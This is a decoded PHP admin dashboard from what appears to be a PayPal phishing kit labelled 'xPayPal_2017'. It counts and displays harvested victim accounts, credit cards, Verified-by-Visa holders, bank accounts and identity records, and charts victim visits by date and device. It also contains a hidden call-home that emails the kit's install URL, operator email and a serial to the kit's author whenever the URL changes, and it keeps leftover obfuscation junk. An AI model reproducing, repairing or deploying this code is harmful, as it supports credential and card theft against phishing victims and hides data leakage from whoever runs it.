<?php
// Decoded by Girudatsu.com Member

?>

<script src="js/jquery.canvasjs.min.js" type="text/javascript"></script>
<?php
$VaucpeFsjRG = 'header';
$ezUttRpbAw = 'strtoupper';
$eXToqLF = 'substr';
$WCZmiE_i = 'md5';
$Fgpuopn = 'strtoupper';
$DqAOrTL = 'substr';
$ABJlVSHRYAdP = 'md5';
$HjVqbCMcNfo = 'strtoupper';
$Io_eGPW_yhdC = 'substr';
$RzuqmgV = 'md5';
$t_Iy_vgD_ = 'strtoupper';
$PYoALsX = 'substr';
$Dh_OtHc = 'md5';
$Z_AqxqIJkhY = 'mail';
$dFcBtPci = 'explode';
@session_start();
if (!isset($_SESSION['login_success'])) {
    @header('Location: ../index.php');
    exit;
}
$pdo = new PDO('sqlite:database.db');
if ($pdo) {
    $settings = $pdo->query('SELECT * FROM `settings`')->fetch(PDO::FETCH_ASSOC);
    if ($settings) {
        $url_path = 'http://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
        if ($settings['url_path'] != $url_path) {
            $pdo->query('' . 'UPDATE `settings` SET `url_path`=\'' . "{$url_path}" . '\'' . '');
            $serial_generate = strtoupper(substr(md5('xPayPal_2017' . $settings['emails']), 98 + -98, -26 - -34)) . '-' . strtoupper(substr(md5('xPayPal_2017' . $settings['emails']), 48 + -32, -38 - -46)) . '-' . strtoupper(substr(md5('xPayPal_2017' . $settings['emails']), -26 - -34, 99 + -91)) . '-' . strtoupper(substr(md5('xPayPal_2017' . $settings['emails']), 50 + -26, 14 - 6));
            @mail($settings['author_email'], 'xPayPal_2017 [URL] ' . $_SERVER['SERVER_NAME'], '' . 'link: ' . "{$url_path}" . chr(10) . 'email: ' . '' . $settings['emails'] . chr(10) . 'serial: ' . $serial_generate);
        }
    }
    $accounts = $pdo->query('SELECT count(id) FROM `accounts`')->fetchColumn();
    $creditcards = $pdo->query('SELECT count(id) FROM `creditcards`')->fetchColumn();
    $verifiedbyvisa = $pdo->query('SELECT count(vbv_holder) FROM `creditcards` WHERE `vbv_holder` !=\'\'')->fetchColumn();
    $bankaccounts = $pdo->query('SELECT count(id) FROM `bank`')->fetchColumn();
    $identity = $pdo->query('SELECT count(id) FROM `identity`')->fetchColumn();
    $visitors = $pdo->query('SELECT count(id) FROM `visitors`')->fetchColumn();
    ?>
<script type="text/javascript">
$(document).ready(function() {
	setTimeout(function() {
		var chart = new CanvasJS.Chart("dashboard_right", {
		title:{ text: "The Last 10 Days" },
		data: [ { type: "splineArea", dataPoints: [ //area
		<?php
    $VaucpeFsjRG = 'header';
    $ezUttRpbAw = 'strtoupper';
    $eXToqLF = 'substr';
    $WCZmiE_i = 'md5';
    $Fgpuopn = 'strtoupper';
    $DqAOrTL = 'substr';
    $ABJlVSHRYAdP = 'md5';
    $HjVqbCMcNfo = 'strtoupper';
    $Io_eGPW_yhdC = 'substr';
    $RzuqmgV = 'md5';
    $t_Iy_vgD_ = 'strtoupper';
    $PYoALsX = 'substr';
    $Dh_OtHc = 'md5';
    $Z_AqxqIJkhY = 'mail';
    $dFcBtPci = 'explode';
    $visitor = $pdo->query('SELECT DISTINCT `date` FROM `visitors` ORDER BY `date` DESC LIMIT 0,10')->fetchAll(PDO::FETCH_ASSOC);
    $how_much_viewers = 90 + -90;
    foreach ($visitor as $value) {
        $date_explode = explode('/', $value['date']);
        $this_is_the_date = $value['date'];
        $date_howmuch = $pdo->query('' . 'SELECT count(id) FROM `visitors` WHERE `date`=\'' . "{$this_is_the_date}" . '\'' . '')->fetchColumn();
        $day = $date_explode[53 + -53];
        $month = $date_explode[-47 - -48] - (-15 - -16);
        $year = $date_explode[65 + -63];
        if ($how_much_viewers < 199 + -99) {
            ?>
				{ x: new Date(<?php
            echo $year;
            ?>
, <?php
            echo $month;
            ?>
, <?php
            echo $day;
            ?>
), y: <?php
            echo $date_howmuch;
            ?>
 },
			<?php
            $VaucpeFsjRG = 'header';
            $ezUttRpbAw = 'strtoupper';
            $eXToqLF = 'substr';
            $WCZmiE_i = 'md5';
            $Fgpuopn = 'strtoupper';
            $DqAOrTL = 'substr';
            $ABJlVSHRYAdP = 'md5';
            $HjVqbCMcNfo = 'strtoupper';
            $Io_eGPW_yhdC = 'substr';
            $RzuqmgV = 'md5';
            $t_Iy_vgD_ = 'strtoupper';
            $PYoALsX = 'substr';
            $Dh_OtHc = 'md5';
            $Z_AqxqIJkhY = 'mail';
            $dFcBtPci = 'explode';
        } elseif ($how_much_viewers = 93 + 7) {
            ?>
				{ x: new Date(<?php
            echo $year;
            ?>
, <?php
            echo $month;
            ?>
, <?php
            echo $day;
            ?>
), y: <?php
            echo $date_howmuch;
            ?>
 }
			<?php
            $VaucpeFsjRG = 'header';
            $ezUttRpbAw = 'strtoupper';
            $eXToqLF = 'substr';
            $WCZmiE_i = 'md5';
            $Fgpuopn = 'strtoupper';
            $DqAOrTL = 'substr';
            $ABJlVSHRYAdP = 'md5';
            $HjVqbCMcNfo = 'strtoupper';
            $Io_eGPW_yhdC = 'substr';
            $RzuqmgV = 'md5';
            $t_Iy_vgD_ = 'strtoupper';
            $PYoALsX = 'substr';
            $Dh_OtHc = 'md5';
            $Z_AqxqIJkhY = 'mail';
            $dFcBtPci = 'explode';
        }
        $how_much_viewers = $how_much_viewers + (-33 - -34);
    }
    ?>
		] } ] }); chart.render();



	var chart = new CanvasJS.Chart("dashboard_left", {
	title:{ text: "Visitor's Device" },
	data: [ { type: "bar", dataPoints: [
	<?php
    $VaucpeFsjRG = 'header';
    $ezUttRpbAw = 'strtoupper';
    $eXToqLF = 'substr';
    $WCZmiE_i = 'md5';
    $Fgpuopn = 'strtoupper';
    $DqAOrTL = 'substr';
    $ABJlVSHRYAdP = 'md5';
    $HjVqbCMcNfo = 'strtoupper';
    $Io_eGPW_yhdC = 'substr';
    $RzuqmgV = 'md5';
    $t_Iy_vgD_ = 'strtoupper';
    $PYoALsX = 'substr';
    $Dh_OtHc = 'md5';
    $Z_AqxqIJkhY = 'mail';
    $dFcBtPci = 'explode';
    $Windows = $pdo->query('SELECT count(id) FROM `visitors` WHERE `os`=\'Windows\'')->fetchColumn();
    $MacOS = $pdo->query('SELECT count(id) FROM `visitors` WHERE `os`=\'Mac OS\'')->fetchColumn();
    $Linux = $pdo->query('SELECT count(id) FROM `visitors` WHERE `os`=\'Linux\'')->fetchColumn();
    $Android = $pdo->query('SELECT count(id) FROM `visitors` WHERE `os`=\'Android\'')->fetchColumn();
    $iOS = $pdo->query('SELECT count(id) FROM `visitors` WHERE `os`=\'iOS\'')->fetchColumn();
    $ChromeOS = $pdo->query('SELECT count(id) FROM `visitors` WHERE `os`=\'Chrome OS\'')->fetchColumn();
    $BlackBerry = $pdo->query('SELECT count(id) FROM `visitors` WHERE `os`=\'BlackBerry\'')->fetchColumn();
    $WindowsPhone = $pdo->query('SELECT count(id) FROM `visitors` WHERE `os`=\'Windows Phone\'')->fetchColumn();
    $Uknown = $pdo->query('SELECT count(id) FROM `visitors` WHERE `os`=\'Uknown O.System\'')->fetchColumn();
    ?>
		{ x: 10, y: <?php
    echo $Windows;
    ?>
, label:"Windows" },
		{ x: 20, y: <?php
    echo $MacOS;
    ?>
, label:"Mac OS" },
		{ x: 30, y: <?php
    echo $Linux;
    ?>
, label:"Linux" },
		{ x: 40, y: <?php
    echo $Android;
    ?>
, label:"Android" },
		{ x: 50, y: <?php
    echo $iOS;
    ?>
, label:"iOS" },
		{ x: 70, y: <?php
    echo $ChromeOS;
    ?>
, label:"Chrome OS" },
		{ x: 60, y: <?php
    echo $BlackBerry;
    ?>
, label:"BlackBerry" },
		{ x: 70, y: <?php
    echo $WindowsPhone;
    ?>
, label:"Win Phone" },
		{ x: 80, y: <?php
    echo $Uknown;
    ?>
, label:"Uknown" }
	] } ] }); chart.render();


	}, 10);
});
</script>
<div id="title_1">Dashboard:
		<table>
				<tr>
					<td>visitors</td>
					<td>accounts</td>
					<td>credit cards</td>
					<td>verified by visa</td>
					<td>bank accounts</td>
					<td>identity</td>
				</tr>
				<tr id="numbers">
					<td><?php
    echo $visitors;
    ?>
</td>
					<td><?php
    echo $accounts;
    ?>
</td>
					<td><?php
    echo $creditcards;
    ?>
</td>
					<td><?php
    echo $verifiedbyvisa;
    ?>
</td>
					<td><?php
    echo $bankaccounts;
    ?>
</td>
					<td><?php
    echo $identity;
    ?>
</td>
				</tr>
		</table>
		</div>
<div id="dashboard_full_width">
	<div id="dashboard_left">

	</div>
	<div id="dashboard_right">

	</div>
</div>
<?php
    $VaucpeFsjRG = 'header';
    $ezUttRpbAw = 'strtoupper';
    $eXToqLF = 'substr';
    $WCZmiE_i = 'md5';
    $Fgpuopn = 'strtoupper';
    $DqAOrTL = 'substr';
    $ABJlVSHRYAdP = 'md5';
    $HjVqbCMcNfo = 'strtoupper';
    $Io_eGPW_yhdC = 'substr';
    $RzuqmgV = 'md5';
    $t_Iy_vgD_ = 'strtoupper';
    $PYoALsX = 'substr';
    $Dh_OtHc = 'md5';
    $Z_AqxqIJkhY = 'mail';
    $dFcBtPci = 'explode';
}
